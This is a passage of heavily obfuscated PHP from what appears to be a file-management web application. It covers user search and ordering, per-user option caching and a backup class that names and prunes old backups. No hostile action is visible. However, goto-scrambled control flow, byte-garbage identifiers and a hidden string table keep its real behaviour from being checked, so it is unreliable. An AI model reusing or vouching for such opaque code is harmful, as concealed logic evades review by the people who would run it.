$FºßèÎøó¡; goto f‰¯œ©Ä¿; f‰¯œ©Ä¿: } private function _makeOrder($BóôààÍåè = '') { goto A¿¬¼¥š­; A¿¬¼¥š­: $c¤ ÀÓˆÑ¹ =& $_SERVER[Ö‘Øù]; $B™Ã”„¥Ì¿ = array($c¤ ÀÓˆÑ¹[1561], $c¤ ÀÓˆÑ¹[28], $c¤ ÀÓˆÑ¹[1716], $c¤ ÀÓˆÑ¹[1688], $c¤ ÀÓˆÑ¹[194]); $B¸Â‡Á—ØÆ = array($c¤ ÀÓˆÑ¹[443] => $c¤ ÀÓˆÑ¹[444], $c¤ ÀÓˆÑ¹[445] => $c¤ ÀÓˆÑ¹[446]); goto FÊ‡øëšÚ; FÊ‡øëšÚ: $cÄîÎášÉ = Input::get($c¤ ÀÓˆÑ¹[450], $c¤ ÀÓˆÑ¹[7], $c¤ ÀÓˆÑ¹[1552], $B™Ã”„¥Ì¿); $EÛ„ÁĞò­Æ = Input::get($c¤ ÀÓˆÑ¹[451], $c¤ ÀÓˆÑ¹[7], $c¤ ÀÓˆÑ¹[1817], array($c¤ ÀÓˆÑ¹[1817], $c¤ ÀÓˆÑ¹[445])); $EÛ„ÁĞò­Æ = $B¸Â‡Á—ØÆ[$EÛ„ÁĞò­Æ]; goto bÓ“¶…Ÿ™; bÓ“¶…Ÿ™: $BóôààÍåè = $BóôààÍåè . "\x75\163\145\162\56{$cÄîÎášÉ}\40{$EÛ„ÁĞò­Æ}\x2c\x20\165\x73\x65\162\x2e\x75\x73\145\162\x49\x44\40\x61\x73\143"; return $this->alias($c¤ ÀÓˆÑ¹[1937])->order($BóôààÍåè); goto a¹º„…¢ˆØ; a¹º„…¢ˆØ: } public function listSearch($e‡îÛ‡çõ) { goto cˆÈ²¤ÏÍŒ; a®•ĞªÕÌ: $B”§ÙÉÕ¡„ = str_replace($FİÈÖ‡ŠõŒ[1820], $FİÈÖ‡ŠõŒ[1821], trim($B”§ÙÉÕ¡„)); $cÂ©¸Ã¼õ‘ = array($FİÈÖ‡ŠõŒ[28] => array($FİÈÖ‡ŠõŒ[381], "\45{$B”§ÙÉÕ¡„}\x25"), $FİÈÖ‡ŠõŒ[303] => array($FİÈÖ‡ŠõŒ[381], "{$B”§ÙÉÕ¡„}\45"), $FİÈÖ‡ŠõŒ[1995] => array($FİÈÖ‡ŠõŒ[381], "{$B”§ÙÉÕ¡„}\x25"), $FİÈÖ‡ŠõŒ[993] => $FİÈÖ‡ŠõŒ[1822]); if (Input::check($B”§ÙÉÕ¡„, $FİÈÖ‡ŠõŒ[309])) { $cÂ©¸Ã¼õ‘[$FİÈÖ‡ŠõŒ[1561]] = array($FİÈÖ‡ŠõŒ[381], "{$B”§ÙÉÕ¡„}\x25"); $cÂ©¸Ã¼õ‘[$FİÈÖ‡ŠõŒ[2176]] = array($FİÈÖ‡ŠõŒ[381], "{$B”§ÙÉÕ¡„}\45"); } goto Aª†ªë‰×ç; e¢®‘àÍá°: $this->_filterByGroup($AŠ×·Ï¿ˆ, $a“Á–ˆ¡³ô); return $AŠ×·Ï¿ˆ; goto dêö÷Øà¯›; cˆÈ²¤ÏÍŒ: $FİÈÖ‡ŠõŒ =& $_SERVER[Ö‘Øù]; $B”§ÙÉÕ¡„ = $e‡îÛ‡çõ[$FİÈÖ‡ŠõŒ[1818]]; $a“Á–ˆ¡³ô = isset($e‡îÛ‡çõ[$FİÈÖ‡ŠõŒ[1819]]) ? $e‡îÛ‡çõ[$FİÈÖ‡ŠõŒ[1819]] : !1; goto a®•ĞªÕÌ; E¥À‹„Ù¶: $AŠ×·Ï¿ˆ = $this->_makeOrder()->where($cÂ©¸Ã¼õ‘)->selectPage(20); if (!$AŠ×·Ï¿ˆ || count($AŠ×·Ï¿ˆ[$FİÈÖ‡ŠõŒ[367]]) < 5 && Input::check($B”§ÙÉÕ¡„, $FİÈÖ‡ŠõŒ[316])) { $b¼¿¦Áã‘à = $this->_searchFromMeta($FİÈÖ‡ŠõŒ[458], $B”§ÙÉÕ¡„, 10); $fŒØ“ïÈâÒ = $this->_searchFromMeta($FİÈÖ‡ŠõŒ[459], $B”§ÙÉÕ¡„, 10); $BÈ”ÜøÛÍ‚ = array_merge($b¼¿¦Áã‘à, $fŒØ“ïÈâÒ, $AŠ×·Ï¿ˆ[$FİÈÖ‡ŠõŒ[367]]); $AŠ×·Ï¿ˆ[$FİÈÖ‡ŠõŒ[367]] = array_unique_by_key($BÈ”ÜøÛÍ‚, $FİÈÖ‡ŠõŒ[1561]); $AŠ×·Ï¿ˆ[$FİÈÖ‡ŠõŒ[364]][$FİÈÖ‡ŠõŒ[365]] = count($AŠ×·Ï¿ˆ[$FİÈÖ‡ŠõŒ[367]]); $AŠ×·Ï¿ˆ[$FİÈÖ‡ŠõŒ[364]][$FİÈÖ‡ŠõŒ[366]] = ceil($AŠ×·Ï¿ˆ[$FİÈÖ‡ŠõŒ[364]][$FİÈÖ‡ŠõŒ[365]] / $AŠ×·Ï¿ˆ[$FİÈÖ‡ŠõŒ[364]][$FİÈÖ‡ŠõŒ[361]]); } $this->_listDataApply($AŠ×·Ï¿ˆ[$FİÈÖ‡ŠõŒ[367]]); goto e¢®‘àÍá°; Aª†ªë‰×ç: if (!$B”§ÙÉÕ¡„) { $cÂ©¸Ã¼õ‘ = array(); } if (isset($e‡îÛ‡çõ[$FİÈÖ‡ŠõŒ[743]])) { $cÂ©¸Ã¼õ‘[$FİÈÖ‡ŠõŒ[743]] = $e‡îÛ‡çõ[$FİÈÖ‡ŠõŒ[743]]; } $cÂ©¸Ã¼õ‘ = $this->parseWhereLike($cÂ©¸Ã¼õ‘); goto E¥À‹„Ù¶; dêö÷Øà¯›: } private function _filterByGroup(&$D´ò®ôˆİ, $dá®£ó‡©×) { $d¬—œ‰‚´Ç =& $_SERVER[Ö‘Øù]; if (!$dá®£ó‡©×) { return $D´ò®ôˆİ; } foreach ($D´ò®ôˆİ[$d¬—œ‰‚´Ç[367]] as $fĞåñ°Èåå => &$e‚ê¾¹Ç) { $FÓ©æ–ôäì = array_to_keyvalue($e‚ê¾¹Ç[$d¬—œ‰‚´Ç[1907]], $d¬—œ‰‚´Ç[33], $d¬—œ‰‚´Ç[1730]); if (!in_array($dá®£ó‡©×, $FÓ©æ–ôäì)) { unset($D´ò®ôˆİ[$d¬—œ‰‚´Ç[367]][$fĞåñ°Èåå]); } } unset($e‚ê¾¹Ç); $D´ò®ôˆİ[$d¬—œ‰‚´Ç[367]] = array_values($D´ò®ôˆİ[$d¬—œ‰‚´Ç[367]]); $D´ò®ôˆİ[$d¬—œ‰‚´Ç[364]] = array($d¬—œ‰‚´Ç[1969] => count($D´ò®ôˆİ[$d¬—œ‰‚´Ç[367]]), $d¬—œ‰‚´Ç[1967] => $D´ò®ôˆİ[$d¬—œ‰‚´Ç[364]][$d¬—œ‰‚´Ç[361]], $d¬—œ‰‚´Ç[1966] => 1, $d¬—œ‰‚´Ç[1968] => 1); } private function _searchFromMeta($BŸğá‘ó, $Eô²Ğ»¬‘, $EŒí“ëªÓ²) { goto bšÙ‹äŒ; DÅÂãËÂÏ: $B½âğÕ¤ï = array_to_keyvalue($B½âğÕ¤ï, $e´ïÇˆˆ“ò[33], $e´ïÇˆˆ“ò[1561]); $fÏŞ†ÅÑ°ò = $this->where(array($e´ïÇˆˆ“ò[1552] => array($e´ïÇˆˆ“ò[7], $B½âğÕ¤ï)))->select(); if (!$fÏŞ†ÅÑ°ò) { return array(); } goto A¾­”®õ×Å; A¾­”®õ×Å: return $fÏŞ†ÅÑ°ò; goto c‡¨ß¨½­ö; e°î•ìÖù: $A×ª¯ï¿Š = $this->parseWhereLike($A×ª¯ï¿Š); $B½âğÕ¤ï = Model($e´ïÇˆˆ“ò[2196])->where($A×ª¯ï¿Š)->limit($EŒí“ëªÓ²)->select(); if (!$B½âğÕ¤ï) { return array(); } goto DÅÂãËÂÏ; bšÙ‹äŒ: $e´ïÇˆˆ“ò =& $_SERVER[Ö‘Øù]; $Eô²Ğ»¬‘ = strtolower($Eô²Ğ»¬‘); $A×ª¯ï¿Š = array($e´ïÇˆˆ“ò[93] => $BŸğá‘ó, $e´ïÇˆˆ“ò[372] => array($e´ïÇˆˆ“ò[381], "\x25{$Eô²Ğ»¬‘}\x25")); goto e°î•ìÖù; c‡¨ß¨½­ö: } private function _listDataApplyItem($a§ª²ªôóÓ) { $eÏÄÂÃ „ = array($a§ª²ªôóÓ); $this->_listDataApply($eÏÄÂÃ „); return $eÏÄÂÃ „[0]; } private function _listDataApply(&$AœÍ¾ï‹Çí) { goto f½ÕçÏÍÀß; f½ÕçÏÍÀß: $Aë²‘Øë¥æ =& $_SERVER[Ö‘Øù]; if (!$AœÍ¾ï‹Çí) { return; } array_remove_key($AœÍ¾ï‹Çí, $Aë²‘Øë¥æ[884]); goto DàÙÁÆ“Ìà; DàÙÁÆ“Ìà: $BÒË˜‰„Í¯ = array_to_keyvalue($AœÍ¾ï‹Çí, $Aë²‘Øë¥æ[33], $Aë²‘Øë¥æ[1561]); $this->_listAppendGroup($AœÍ¾ï‹Çí, $BÒË˜‰„Í¯); $this->_listAppendMeta($AœÍ¾ï‹Çí, $BÒË˜‰„Í¯); goto fĞ±¦‡É¹; fĞ±¦‡É¹: $this->_listAppendSourceRoot($AœÍ¾ï‹Çí, $BÒË˜‰„Í¯); goto fïĞ¾¦´äæ; fïĞ¾¦´äæ: } private function _listAppendSourceRoot(&$dÔôğ¥‰Ñ, $b¾ÙĞ÷Æª) { goto Bœù¬’é†–; b¬İÉ°¹ñÖ: foreach ($dÔôğ¥‰Ñ as &$B¬õ›¼“§ˆ) { $B¬õ›¼“§ˆ[$eµ¹®±Õ®[85]] = $EÇ‹‘˜¤˜ù[$B¬õ›¼“§ˆ[$eµ¹®±Õ®[1561]]] ? $EÇ‹‘˜¤˜ù[$B¬õ›¼“§ˆ[$eµ¹®±Õ®[1561]]] : array(); } unset($B¬õ›¼“§ˆ); goto E‘Á‚äÊ–®; Bœù¬’é†–: $eµ¹®±Õ® =& $_SERVER[Ö‘Øù]; $c±ùöœ = array($eµ¹®±Õ®[493] => 0, $eµ¹®±Õ®[499] => array($eµ¹®±Õ®[7], $b¾ÙĞ÷Æª), $eµ¹®±Õ®[406] => SourceModel::TYPE_USER); $e«¨Ç‰Ãó¬ = Model($eµ¹®±Õ®[825])->order($eµ¹®±Õ®[1828])->field($eµ¹®±Õ®[1829]); goto fÜœàîŞã; fÜœàîŞã: $EÇ‹‘˜¤˜ù = $e«¨Ç‰Ãó¬->limit(count($b¾ÙĞ÷Æª))->where($c±ùöœ)->select(); $EÇ‹‘˜¤˜ù = array_to_keyvalue($EÇ‹‘˜¤˜ù, $eµ¹®±Õ®[499]); $EÇ‹‘˜¤˜ù = array_remove_key($EÇ‹‘˜¤˜ù, $eµ¹®±Õ®[499]); goto b¬İÉ°¹ñÖ; E‘Á‚äÊ–®: } private function _listAppendGroup(&$dĞ¡’”± , $e½‰±¦ªŸ) { goto d©Ğ¤ÌÍÊ¸; FØËœ«è¾Ë: $bç¬ÚôÔ‘Î = array_to_keyvalue_group($bç¬ÚôÔ‘Î, $D£õË§»¥[1561]); foreach ($bç¬ÚôÔ‘Î as &$DÍñïçÕØÃ) { $eå„Õ¦´‰õ = array(); foreach ($DÍñïçÕØÃ as $aŠŒÍçÙŠ) { if (!$aŠŒÍçÙŠ[$D£õË§»¥[1830]]) { continue; } $Cšø…ÛÓ = Model($D£õË§»¥[502])->listData($aŠŒÍçÙŠ[$D£õË§»¥[1830]]); $eå„Õ¦´‰õ[] = array($D£õË§»¥[1730] => $aŠŒÍçÙŠ[$D£õË§»¥[1730]], $D£õË§»¥[2198] => $FÇÏ®Íğ[$aŠŒÍçÙŠ[$D£õË§»¥[1730]]][$D£õË§»¥[28]], $D£õË§»¥[516] => $FÇÏ®Íğ[$aŠŒÍçÙŠ[$D£õË§»¥[1730]]][$D£õË§»¥[516]], $D£õË§»¥[408] => $Cšø…ÛÓ); } $DÍñïçÕØÃ = $eå„Õ¦´‰õ; } unset($DÍñïçÕØÃ); goto Cñ½½Ÿ…Ï¿; bäÜšÓœÒİ: $aæ·ˆ™Ìõ = array($D£õË§»¥[1730] => array($D£õË§»¥[7], $F¶Œ£Œ³ÀØ)); $FÇÏ®Íğ = Model($D£õË§»¥[1905])->field($D£õË§»¥[2197])->where($aæ·ˆ™Ìõ)->select(); $FÇÏ®Íğ = array_to_keyvalue($FÇÏ®Íğ, $D£õË§»¥[1730]); goto FØËœ«è¾Ë; Cæˆ‚çã…ã: $F¶Œ£Œ³ÀØ = array_to_keyvalue($bç¬ÚôÔ‘Î, $D£õË§»¥[33], $D£õË§»¥[1730]); $F¶Œ£Œ³ÀØ = array_remove_value(array_unique($F¶Œ£Œ³ÀØ), $D£õË§»¥[191]); if (!$F¶Œ£Œ³ÀØ || !$bç¬ÚôÔ‘Î) { return; } goto bäÜšÓœÒİ; Cñ½½Ÿ…Ï¿: foreach ($dĞ¡’”±  as &$bÙéß‰‘ïš) { $bÙéß‰‘ïš[$D£õË§»¥[1907]] = array(); if (isset($bç¬ÚôÔ‘Î[$bÙéß‰‘ïš[$D£õË§»¥[1561]]])) { $bÙéß‰‘ïš[$D£õË§»¥[1907]] = $bç¬ÚôÔ‘Î[$bÙéß‰‘ïš[$D£õË§»¥[1561]]]; } } unset($bÙéß‰‘ïš); goto f‡—ö×éõô; d©Ğ¤ÌÍÊ¸: $D£õË§»¥ =& $_SERVER[Ö‘Øù]; $aæ·ˆ™Ìõ = array($D£õË§»¥[1561] => array($D£õË§»¥[7], $e½‰±¦ªŸ)); $bç¬ÚôÔ‘Î = Model($D£õË§»¥[1816])->where($aæ·ˆ™Ìõ)->select(); goto Cæˆ‚çã…ã; f‡—ö×éõô: } public function userAppendGroup($eìŸäğ˜Šã) { $DŞÎõ‘÷ =& $_SERVER[Ö‘Øù]; if (!$eìŸäğ˜Šã) { return array(); } $this->_listAppendGroup($eìŸäğ˜Šã, array_to_keyvalue($eìŸäğ˜Šã, $DŞÎõ‘÷[33], $DŞÎõ‘÷[1561])); return $eìŸäğ˜Šã; } private function _listAppendMeta(&$DÑİØÌ‡¨, $EÛë¼¹•Ó) { goto EæĞºÔ”; dÌà‚Í¢ºÚ: foreach ($E¡Şöƒš¨ as &$bØãƒµŠî ) { $A³Â¤™”ã¯ = array(); foreach ($bØãƒµŠî  as $Cïò´™¤Œ) { if (!in_array($Cïò´™¤Œ[$dŞ’âºÏÖ÷[93]], $C‡©é™à“)) { $A³Â¤™”ã¯[$Cïò´™¤Œ[$dŞ’âºÏÖ÷[93]]] = $Cïò´™¤Œ[$dŞ’âºÏÖ÷[372]]; } } $bØãƒµŠî  = $A³Â¤™”ã¯; } unset($bØãƒµŠî ); $dÚ¹©¡²‚ = Model($dŞ’âºÏÖ÷[2199]); goto aÂËîì¸; aÂËîì¸: foreach ($DÑİØÌ‡¨ as &$F¿İÜÇ‘Ø·) { $BÕŠ¨¤Ê© = array(); if (isset($E¡Şöƒš¨[$F¿İÜÇ‘Ø·[$dŞ’âºÏÖ÷[1561]]])) { $BÕŠ¨¤Ê© = $E¡Şöƒš¨[$F¿İÜÇ‘Ø·[$dŞ’âºÏÖ÷[1561]]]; } $F¿İÜÇ‘Ø·[$dŞ’âºÏÖ÷[2200]] = array(); if (isset($BÕŠ¨¤Ê©[$dÜ‚Ô»×™—])) { $F¿İÜÇ‘Ø·[$dŞ’âºÏÖ÷[2200]] = $dÚ¹©¡²‚->getUserJobInfo($BÕŠ¨¤Ê©[$dÜ‚Ô»×™—]); } } unset($F¿İÜÇ‘Ø·); goto FÖ±ñ‘öªÑ; bÅ´ö‰¿² : $fÊ±Ê‚½ = array($dŞ’âºÏÖ÷[1561] => array($dŞ’âºÏÖ÷[7], $EÛë¼¹•Ó)); $E¡Şöƒš¨ = Model($dŞ’âºÏÖ÷[2175])->where($fÊ±Ê‚½)->select(); $E¡Şöƒš¨ = array_to_keyvalue_group($E¡Şöƒš¨, $dŞ’âºÏÖ÷[1561]); goto dÌà‚Í¢ºÚ; EæĞºÔ”: $dŞ’âºÏÖ÷ =& $_SERVER[Ö‘Øù]; $dÜ‚Ô»×™— = UserJobModel::JOB_KEY; $C‡©é™à“ = array($dŞ’âºÏÖ÷[2177]); goto bÅ´ö‰¿² ; FÖ±ñ‘öªÑ: } protected function groupUserAll($E®ÔÁë¹Ë) { $AºïËÆèå® =& $_SERVER[Ö‘Øù]; if (!$E®ÔÁë¹Ë) { return !1; } $c† ÷šÃ» = Model($AºïËÆèå®[1816])->field($AºïËÆèå®[1561])->where(array($AºïËÆèå®[1730] => array($AºïËÆèå®[7], $E®ÔÁë¹Ë)))->select(); $c† ÷šÃ» = array_to_keyvalue($c† ÷šÃ», $AºïËÆèå®[33], $AºïËÆèå®[1561]); return array_unique($c† ÷šÃ»); } public function userSearch($A……ª—ÛßÍ, $CÇÎ´Ò¡”Ê = "\52") { return Model($_SERVER[Ö‘Øù][533])->where($A……ª—ÛßÍ)->field($CÇÎ´Ò¡”Ê)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\x5f\157\160\x74\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($a«–—´È¯) { $CëÑŠ‹² =& $_SERVER[Ö‘Øù]; if (!defined($CëÑŠ‹²[469])) { define($CëÑŠ‹²[469], 0); } return "\x55\x73\x65\162\117\x70\164\x69\157\x6e\137{$a«–—´È¯}\137" . USER_ID; } protected function filterWhere($b®ÂÃ›™õ) { $b¨®ßˆ„¾Ğ =& $_SERVER[Ö‘Øù]; if (!defined($b¨®ßˆ„¾Ğ[469])) { define($b¨®ßˆ„¾Ğ[469], 0); } $b®ÂÃ›™õ[$b¨®ßˆ„¾Ğ[1561]] = USER_ID; return $b®ÂÃ›™õ; } public function cacheRemoveUser($C‰×ˆÕš, $dÅÇó”«Œ) { return Cache::remove("\125\163\145\x72\117\x70\164\151\157\156\137{$C‰×ˆÕš}\x5f" . $dÅÇó”«Œ); } protected function optionDefault($CãÌ…­ò´… = '') { $AŠ˜Ó¶»Ù® =& $_SERVER[Ö‘Øù]; if ($CãÌ…­ò´… == $AŠ˜Ó¶»Ù®[33]) { return $GLOBALS[$AŠ˜Ó¶»Ù®[6]][$AŠ˜Ó¶»Ù®[2201]]; } if ($CãÌ…­ò´… == $AŠ˜Ó¶»Ù®[2202]) { return $GLOBALS[$AŠ˜Ó¶»Ù®[6]][$AŠ˜Ó¶»Ù®[2203]]; } } } goto CË¿îì—Ì; DÏº¼…ñå: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $bôß–©ä =& $_SERVER[Ö‘Øù]; $this->isManual(); self::$name = date($bôß–©ä[741]); if (!($BŒÇ“«¤º¦ = Model($bôß–©ä[742])->lastItem())) { $BŒÇ“«¤º¦ = $this->initData(); } else { self::$name = $BŒÇ“«¤º¦[$bôß–©ä[28]]; if ($BŒÇ“«¤º¦[$bôß–©ä[743]] == $bôß–©ä[87]) { self::$name = date($bôß–©ä[744]); $aâ¢‰•™¯ = 0; if (isset($BŒÇ“«¤º¦[$bôß–©ä[291]][$bôß–©ä[193]][$bôß–©ä[462]])) { $aâ¢‰•™¯ = (int) $BŒÇ“«¤º¦[$bôß–©ä[291]][$bôß–©ä[193]][$bôß–©ä[462]]; } if (self::$manual == 0 && $BŒÇ“«¤º¦[$bôß–©ä[28]] == self::$name) { Model($bôß–©ä[742])->remove($BŒÇ“«¤º¦[$bôß–©ä[395]]); } $BŒÇ“«¤º¦ = $this->initData($aâ¢‰•™¯, $BŒÇ“«¤º¦[$bôß–©ä[745]]); } else { $this->checkStore($BŒÇ“«¤º¦[$bôß–©ä[745]]); } } self::$option = $BŒÇ“«¤º¦; } private function isManual() { $dÍ“íøğ½ = _get($GLOBALS, $_SERVER[Ö‘Øù][746], 0); $dÍ“íøğ½ = intval($dÍ“íøğ½); self::$manual = $dÍ“íøğ½ && $dÍ“íøğ½ == 1 ? 1 : 0; } private function initData($FñÑ¸ÊÓì = 0, $dãâ÷£…†é = '') { goto B¤’ÍÎ§ø±; B¤’ÍÎ§ø±: $fÄ‹¸ŒÀØï =& $_SERVER[Ö‘Øù]; $dàÍ‡š×•ä = Model($fÄ‹¸ŒÀØï[742])->config(); if ($dãâ÷£…†é && $dàÍ‡š×•ä[$fÄ‹¸ŒÀØï[745]] != $dãâ÷£…†é) { $FñÑ¸ÊÓì = 0; } goto BËÇßÌÒÊ; dÌ›£•µİ†: $a‹¸Í¨ñ˜ = Model($fÄ‹¸ŒÀØï[742])->insert($D­»äÈ•ØÚ); $D­»äÈ•ØÚ[$fÄ‹¸ŒÀØï[395]] = $a‹¸Í¨ñ˜; return $D­»äÈ•ØÚ; goto dïÒ§‡¨Ô; BËÇßÌÒÊ: $this->checkStore($dàÍ‡š×•ä[$fÄ‹¸ŒÀØï[745]]); if (self::$manual == 1) { self::$name .= $fÄ‹¸ŒÀØï[71] . date($fÄ‹¸ŒÀØï[747]); } $D­»äÈ•ØÚ = array($fÄ‹¸ŒÀØï[745] => $dàÍ‡š×•ä[$fÄ‹¸ŒÀØï[745]], $fÄ‹¸ŒÀØï[28] => self::$name, $fÄ‹¸ŒÀØï[743] => 0, $fÄ‹¸ŒÀØï[748] => $dàÍ‡š×•ä[$fÄ‹¸ŒÀØï[748]], $fÄ‹¸ŒÀØï[749] => self::$manual, $fÄ‹¸ŒÀØï[291] => array($fÄ‹¸ŒÀØï[750] => array($fÄ‹¸ŒÀØï[743] => 0), $fÄ‹¸ŒÀØï[751] => array($fÄ‹¸ŒÀØï[743] => 0, $fÄ‹¸ŒÀØï[752] => 0, $fÄ‹¸ŒÀØï[753] => 0, $fÄ‹¸ŒÀØï[29] => $fÄ‹¸ŒÀØï[33], $fÄ‹¸ŒÀØï[754] => 0, $fÄ‹¸ŒÀØï[491] => 0), $fÄ‹¸ŒÀØï[755] => array($fÄ‹¸ŒÀØï[743] => 0, $fÄ‹¸ŒÀØï[752] => 0, $fÄ‹¸ŒÀØï[753] => 0, $fÄ‹¸ŒÀØï[754] => 0, $fÄ‹¸ŒÀØï[491] => 0), $fÄ‹¸ŒÀØï[193] => array($fÄ‹¸ŒÀØï[743] => 0, $fÄ‹¸ŒÀØï[756] => 0, $fÄ‹¸ŒÀØï[757] => 0, $fÄ‹¸ŒÀØï[758] => 0, $fÄ‹¸ŒÀØï[759] => 0, $fÄ‹¸ŒÀØï[462] => $FñÑ¸ÊÓì, $fÄ‹¸ŒÀØï[754] => 0, $fÄ‹¸ŒÀØï[491] => 0)), $fÄ‹¸ŒÀØï[754] => time(), $fÄ‹¸ŒÀØï[491] => 0); goto dÌ›£•µİ†; dïÒ§‡¨Ô: } private function checkStore($A…¶‰µóÏ) { $aíŠó‡‹‡ =& $_SERVER[Ö‘Øù]; $BŠ˜‹”¾” = Model($aíŠó‡‹‡[760])->listData($A…¶‰µóÏ); Model($aíŠó‡‹‡[760])->checkConfig($BŠ˜‹”¾”); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ö‘Øù][742])->findByName(self::$name); } return self::$option; } public static function set($bÀÈÒ’éÒ–) { $eóŠ™ùÁ‘¶ =& $_SERVER[Ö‘Øù]; $eİøªóøÉ¯ = self::get(); foreach ($bÀÈÒ’éÒ– as $F³²¿òÙìŠ => $d…¦Àùô‰½) { $B©÷ªÙ¾¡ = explode($eóŠ™ùÁ‘¶[95], $F³²¿òÙìŠ); $C°¿´ ãÛ = count($B©÷ªÙ¾¡); switch ($C°¿´ ãÛ) { case 1: $eİøªóøÉ¯[$B©÷ªÙ¾¡[0]] = $d…¦Àùô‰½; break; case 2: $eİøªóøÉ¯[$B©÷ªÙ¾¡[0]][$B©÷ªÙ¾¡[1]] = $d…¦Àùô‰½; break; case 3: $eİøªóøÉ¯[$B©÷ªÙ¾¡[0]][$B©÷ªÙ¾¡[1]][$B©÷ªÙ¾¡[2]] = $d…¦Àùô‰½; break; } } Model($eóŠ™ùÁ‘¶[742])->update($eİøªóøÉ¯[$eóŠ™ùÁ‘¶[395]], $eİøªóøÉ¯); self::$option = $eİøªóøÉ¯; return self::$option; } public function keep() { $AÌß¾Ñ² =& $_SERVER[Ö‘Øù]; $CˆŞ¦˜‰¥º = self::get(); if ($CˆŞ¦˜‰¥º[$AÌß¾Ñ²[291]][$AÌß¾Ñ²[750]][$AÌß¾Ñ²[743]] == $AÌß¾Ñ²[87]) { return; } $this->backupKeep($CˆŞ¦˜‰¥º); self::set(array($AÌß¾Ñ²[761] => 1)); } private function backupKeep($dºËôõ¤ò£) { goto D±ÏĞâì¡Ú; D±ÏĞâì¡Ú: $AÅ¼òö–ñ =& $_SERVER[Ö‘Øù]; if (self::$manual == 1) { return; } $c¨Â¶Ûå¹Ú = Model($AÅ¼òö–ñ[742])->listData(); goto dÊ›¤¿‡°; dÊ›¤¿‡°: if (empty($c¨Â¶Ûå¹Ú)) { return; } $E¸ƒö¾£ Ù = 0; $B‚¯“‡Ğó = array(); goto aŒÂÖÎòÑÑ; AÖ™¥¯”‰: $E’®¸¨¯« = Model($AÅ¼òö–ñ[763])->get($AÅ¼òö–ñ[764]); foreach ($c¨Â¶Ûå¹Ú as $b…ÕÄ‚®¶‚) { if (isset($b…ÕÄ‚®¶‚[$AÅ¼òö–ñ[749]]) && $b…ÕÄ‚®¶‚[$AÅ¼òö–ñ[749]] == $AÅ¼òö–ñ[87]) { continue; } if (!empty($b…ÕÄ‚®¶‚[$AÅ¼òö–ñ[28]]) && in_array($b…ÕÄ‚®¶‚[$AÅ¼òö–ñ[28]], $B‚¯“‡Ğó)) { continue; } Model($AÅ¼òö–ñ[742])->remove($b…ÕÄ‚®¶‚[$AÅ¼òö–ñ[395]]); $aºç‚Á³¿ = $this->backupPath($dºËôõ¤ò£, $E’®¸¨¯«); IO::remove($aºç‚Á³¿, !1); } goto dá¨è¥‡İÌ; aŒÂÖÎòÑÑ: foreach ($c¨Â¶Ûå¹Ú as $b…ÕÄ‚®¶‚) { if ($E¸ƒö¾£ Ù >= 7) { break; } $B‚¯“‡Ğó[] = $b…ÕÄ‚®¶‚[$AÅ¼òö–ñ[28]]; $E¸ƒö¾£ Ù++; } for ($E¸ƒö¾£ Ù = 0; $E¸ƒö¾£ Ù < 12; $E¸ƒö¾£ Ù++) { $B‚¯“‡Ğó[] = date($AÅ¼òö–ñ[762], strtotime("\55{$E¸ƒö¾£ Ù}\40\x6d\x6f\x6e\x74\x68\x73")); } $B‚¯“‡Ğó = array_unique($B‚¯“‡Ğó); goto AÖ™¥¯”‰; dá¨è¥‡İÌ: } private function backupPath($CáË©²ôƒ, $FÀ­‘É¯« = false) { $DÇ«¢…ã„Ñ =& $_SERVER[Ö‘Øù]; if (!$FÀ­‘É¯«) { $FÀ­‘É¯« = Model($DÇ«¢…ã„Ñ[763])->get($DÇ«¢…ã„Ñ[764]); } $D‰…Šé¶’ = $CáË©²ôƒ[$DÇ«¢…ã„Ñ[28]]; $eàì¬ÀÚå§ = substr(md5($DÇ«¢…ã„Ñ[765] . $FÀ­‘É¯« . $D‰…Šé¶’), 0, 8); return "\173\x69\157\x3a{$CáË©²ôƒ[$DÇ«¢…ã„Ñ[745]]}\x7d\57\144\141\164\x61\x62\141\x73\145\x2f\x62\x61\143\153\165\x70\57" . $D‰…Šé¶’ . $DÇ«¢…ã„Ñ[71] . $eàì¬ÀÚå§; } public function db() { goto C·º·‚İîÄ; Eï«„³’Õ÷: return !0; goto D¾³é ãÏ; C·º·‚İîÄ: $bšôªÔÍ =& $_SERVER[Ö‘Øù]; $F•¯Ú¯•™ˆ = self::get(); if ($F•¯Ú¯•™ˆ[$bšôªÔÍ[291]][$bšôªÔÍ[751]][$bšôªÔÍ[743]] == $bšôªÔÍ[87]) { return !0; } goto d¥ß—œ£‚; d¥ß—œ£‚: $B¸Ö‚ëó = new BackupDb(); if (!$B¸Ö‚ëó->index()) { return !1; } self::set(array($bšôªÔÍ[766] => 1)); goto Eï«„³’Õ÷; D¾³é ãÏ: } public function dbFile() { goto c™®Ãºù¶Â; eÌ†…‡ê§: return !0; goto D–ˆãÌğ‚ä; F‰“´áŠ£‘: $côäåé»À„ = new BackupDbFile(); if (!$côäåé»À„->index()) { return !1; } self::set(array($AÏºñåÂ¾±[767] => 1)); goto eÌ†…‡ê§; c™®Ãºù¶Â: $AÏºñåÂ¾± =& $_SERVER[Ö‘Øù]; $féÁÂ·—¡ = self::get(); if ($féÁÂ·—¡[$AÏºñåÂ¾±[291]][$AÏºñåÂ¾±[755]][$AÏºñåÂ¾±[743]] == $AÏºñåÂ¾±[87]) { return !0; } goto F‰“´áŠ£‘; D–ˆãÌğ‚ä: } public function file() { $Eš™­ƒÉå =& $_SERVER[Ö‘Øù]; $Dî–Óº»…„ = self::get(); if ($Dî–Óº»…„[$Eš™­ƒÉå[291]][$Eš™­ƒÉå[193]][$Eš™­ƒÉå[743]] == $Eš™­ƒÉå[87]) { return !0; } if (!isset($Dî–Óº»…„[$Eš™­ƒÉå[748]]) || $Dî–Óº»…„[$Eš™­ƒÉå[748]] == $Eš™­ƒÉå[191]) { $dÎÕ“©¾Ôã = new BackupFile(); if (!$dÎÕ“©¾Ôã->index()) { return !1; } } self::set(array($Eš™­ƒÉå[768] => 1, $Eš™­ƒÉå[743] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto eô«æ×××; eğøÙÏë‡: $fâğÅÒÎ¾° = $this->tmpFilesPath() . $aÙƒãœôš[771] . self::$name . $aÙƒãœôš[8]; del_dir($fâğÅÒÎ¾°); mk_dir($fâğÅÒÎ¾°); goto 